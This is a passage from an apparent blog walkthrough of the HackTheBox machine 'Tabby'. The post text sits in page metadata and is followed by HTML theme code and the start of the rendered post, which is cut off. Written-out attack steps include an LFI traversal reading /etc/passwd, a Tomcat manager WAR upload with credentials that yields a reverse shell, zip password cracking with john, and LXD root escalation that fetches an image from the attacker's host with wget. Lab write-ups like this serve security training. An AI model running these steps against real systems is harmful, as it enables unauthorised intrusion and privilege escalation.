&#39;tomcat:$3cureP4s5w0rd123!&#39; --upload-file payload.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/payload.war&quot; When you see ok that means the payload has been uploaded successfully. Now set up listener nc -lvnp 5566 and go to tabby.htb:8080/payload.war and you should get a reverse shell. use python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; for the shell upgrade. tomcat@tabby:/var/www/html/files$ ls ls 16162020_backup.zip archive revoked_certs statement tomcat@tabby:/var/www/html/files$ Privilege escalation to User ASH Ennumeration on /var/www/html there is a folder called files which contains a backup.zip file 16162020_backup.zip tomcat@tabby:/var/www/html/files$ ls -la ls -la total 36 drwxr-xr-x 4 ash ash 4096 Jun 17 21:59 . drwxr-xr-x 4 root root 4096 Jun 17 16:24 .. -rw-r--r-- 1 ash ash 8716 Jun 16 13:42 16162020_backup.zip So I tried extracting it, but it is password protected. Cracking the password with JOHN. zip2john 16162020_backup.zip &gt;&gt; backup-hash 16162020_backup.zip/var/www/html/assets/ is not encrypted! ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time. Trying to crack the hash with the help of rockyou.txt. john backup-hash -w=/usr/share/wordlists/rockyou.txt and the password is admin@it . Unzipping the file with the password found. unzip 16162020_backup.zip Archive: 16162020_backup.zip creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password: inflating: var/www/html/favicon.ico creating: var/www/html/files/ inflating: var/www/html/index.php extracting: var/www/html/logo.png inflating: var/www/html/news.php inflating: var/www/html/Readme.txt Bad luck! That was a Rabbit hole.. So I used the password admin@it with the user ash. su - ash Password: admin@it ash@tabby:~$ whoami whoami ash Getting User.txt ash@tabby:~$ cat user.txt cat user.txt d**********1 Privilege Escalation to Root. Checking the id of ash ash@tabby:~$ id id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) We see that ash is part of lxd group. So according to article https://www.hackingarticles.in/lxd-privilege-escalation/ I just followed the steps and got root . As there are many ways on priv esc using LXD I took help of hackingarticles for it. git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine You will get a tar.gz file. Set up http server and copy it to the remote machine. python -m SimpleHTTPServer 8080 On another hand we will download the alpine-image inside /tmp directory on the host machine. cd /tmp wget http://10.10.14.17:8080/apline-v3.10-x86_64-20191008_1227.tar.gz After the image is built it can be added as an image to LXD as follows: lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage lxc image list lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh id ``` shell cd /mnt/root/root cd /mnt/root/root /mnt/root/root # cat root.txt cat root.txt 3**********5 If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968","dateModified":"2020-07-06T22:09:00+05:30","datePublished":"2020-07-06T22:09:00+05:30","headline":"HackTheBox Tabby","mainEntityOfPage":{"@type":"WebPage","@id":"https://jeevanachandra.github.io//hackthebox/2020/07/06/Tabby.html"},"@type":"BlogPosting","author":{"@type":"Person","name":"Jeevan Chandra"},"url":"https://jeevanachandra.github.io//hackthebox/2020/07/06/Tabby.html","image":"https://jeevanachandra.github.io//assets/img/sample/tabby/tabby.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="https://jeevanachandra.github.io//feed.xml" title="DC0deZer0">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<header class="site-header " role="banner">
+
+  <div class="wrapper">
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
+  DC0deZer0
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>
+
+          <div class="trigger">
+<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
+
+
+
+
+<span class="page-link">
+
+<div id="google_translate_element" style="display: none;">
+</div>
+
+<span class="ct-language">
+  <ul class="list-unstyled ct-language-dropdown">
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="en">
+          
+          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="fr">
+          
+          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="zh-CN">
+          
+          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ja">
+          
+          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ko">
+          
+          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ru">
+          
+          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
+          
+        </a>
+      </li>
+    
+  </ul>
+</span>
+
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: '',
+    autoDisplay: false,
+    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
+  }, 'google_translate_element');
+
+  function restoreLang() {
+    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
+    if (!iframe) return;
+
+    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+    var restore_el = innerDoc.getElementsByTagName("button");
+
+    for (var i = 0; i < restore_el.length; i++) {
+      if (restore_el[i].id.indexOf("restore") >= 0) {
+        restore_el[i].click();
+        var close_el = innerDoc.getElementsByClassName("goog-close-link");
+        close_el[0].click();
+        return;
+      }
+    }
+  }
+
+  function triggerHtmlEvent(element, eventName) {
+    var event;
+    if (document.createEvent) {
+      event = document.createEvent('HTMLEvents');
+      event.initEvent(eventName, true, true);
+      element.dispatchEvent(event);
+    } else {
+      event = document.createEventObject();
+      event.eventType = eventName;
+      element.fireEvent('on' + event.eventType, event);
+    }
+  }
+
+  var googleCombo = document.querySelector("select.goog-te-combo");
+  var langSelect = document.querySelector('.ct-language');
+  langSelect.addEventListener('click', function(event) {
+    if (!event.target) {
+      return;
+    }
+
+    var selected = document.querySelector('.ct-language .ct-language-selected');
+    if (selected) {
+      selected.classList.remove('ct-language-selected');
+    }
+
+    var target = event.target;
+    while (target && target !== langSelect ) {
+      if (target.matches('.lang-select')) {
+        break;
+      }
+      target = target.parentElement;
+    }
+
+    if (target && target.matches('.lang-select')) {
+      var lang = target.getAttribute('data-lang');
+      if (googleCombo.value == lang) {
+        restoreLang();
+      } else {
+        target.parentElement.classList.add('ct-language-selected');
+        googleCombo.value = lang;
+        triggerHtmlEvent(googleCombo, 'change');
+      }
+    }
+
+    event.preventDefault();
+  });
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</span>
+</div>
+        </nav>
+</div>
+  </div>
+</header>
+
+<script>
+  (function() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+
+
+
+
+
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Tabby</h1>
+  <h3 class="post-subtitle"></h3>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2020-07-06T22:09:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Jul 06, 2020
+    </time>
+    
+    <img src="/assets/img/sample/tabby/tabby.png">
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 16 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#linux">#linux</a><a class="post-tag" href="/tags.html#gobuster">#gobuster</a><a class="post-tag" href="/tags.html#lfi">#lfi</a><a class="post-tag" href="/tags.html#john">#john</a><a class="post-tag" href="/tags.html#tomcat">#tomcat</a><a class="post-tag" href="/tags.html#lxd">#lxd</a>
+</div></header>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h2 id="lets-get-started">Let’s get started</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th colspan="4">Column</th>
+      
+      
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: right">OS</td>
+      <td colspan="5">
+</td>
+      
+    </tr>
+    <tr>
+      <td colspan="5" style="text-align: right">Difficulty</td>
+      
+      
+    </tr>
+    <tr>
+      <td style="text-align: right">Points</td>
+      <td colspan="5">
+</td>
+      
+    </tr>
+    <tr>
+      <td style="text-align: right">Release</td>
+      <td colspan="5">
+</td>
+      
+    </tr>
+    <tr>
+      <td style="text-align: right">IP</td>
+      <td colspan="5">
+</td>
+      
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span>
+Discovered open port 80/tcp on 10.10.10.194
+Discovered open port 8080/tcp on 10.10.10.194
+Discovered open port 22/tcp on 10.10.10.194
+Completed SYN Stealth Scan at 07:52, 2.07s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>6/21%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>41896%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>5EEF000
+OS:0%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10C%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS
+OS:<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M54DST1
+OS:1NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE88%W2<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE88<span class="o">)</span>ECN
+OS:<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>FAF0%O<span class="o">=</span>M54DNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>A
+OS:S%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span>R
+OS:<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F
+OS:<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%
+OS:T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD
+OS:<span class="o">=</span>S<span class="o">)</span>
+
+Uptime guess: 12.366 days <span class="o">(</span>since Tue Jun  9 00\:49\:25 2020<span class="o">)</span>
+Network Distance: 2 hops
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>261 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o\:linux\:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 995/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   128.32 ms 10.10.14.1
+2   128.88 ms 10.10.10.194
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:36
+Completed NSE at 09:36, 0.00s elapsed
+Initiating NSE at 09:36
+Completed NSE at 09:36, 0.00s elapsed
+Initiating NSE at 09:36
+Completed NSE at 09:36, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>31.88 seconds
+           Raw packets sent: 1289 <span class="o">(</span>61.746KB<span class="o">)</span> | Rcvd: 1410 <span class="o">(</span>433.356KB<span class="o">)</span>
+</code></pre></div></div>
+<p>On visiting the <code class="language-plaintext highlighter-rouge">port 80</code> there is a website <code class="language-plaintext highlighter-rouge">Megahosting.HTB</code> with some content on it.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby1.png" alt=""></p>
+
+<p>So I desided to add <code class="language-plaintext highlighter-rouge">megahosting.htb</code> to  <code class="language-plaintext highlighter-rouge">/etc/hosts</code> in my kali.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">10.10.10.194 tabby.htb megahosting.htb</code></p>
+</blockquote>
+
+<p>After all the things are done, then I came to see that a <code class="language-plaintext highlighter-rouge">URL</code> ` http://megahosting.htb/news.php?file=statement<code class="language-plaintext highlighter-rouge"> looks like </code>LFI` is going to work out.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby2.png" alt=""></p>
+
+<h2 id="lfi">LFI</h2>
+
+<p>A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time.</p>
+
+<p>So I was able to get the /etc/passwd by doing so <code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=../.../etc/passwd</code>. we get directory traversal.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="ss">:x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="ss">\:root\:/</span><span class="n">root</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="ss">:x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="ss">\:daemon\:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">bin</span><span class="ss">:x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="ss">\:bin\:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="ss">:x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="ss">\:sys\:/</span><span class="n">dev</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="ss">:x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="ss">\:sync\:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="ss">:x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="ss">\:games\:/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="ss">:x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="ss">\:man\:/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="ss">:x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="ss">\:lp\:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="ss">:x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="ss">\:mail\:/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="ss">:x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="ss">\:news\:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="ss">:x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="ss">\:uucp\:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="ss">:x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="ss">\:proxy\:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
